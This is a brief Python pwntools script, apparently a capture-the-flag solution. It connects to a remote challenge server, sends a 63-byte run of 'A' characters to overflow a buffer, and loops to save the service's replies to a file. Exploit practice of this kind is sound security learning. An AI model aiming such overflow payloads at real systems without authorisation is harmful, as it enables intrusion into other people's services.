from pwn import *

p = remote("0.cloud.chals.io", 15937)

p.sendline(b"A" * 63)

with open("output.txt", "wb+") as f:
    while True:
        f.write(p.recv())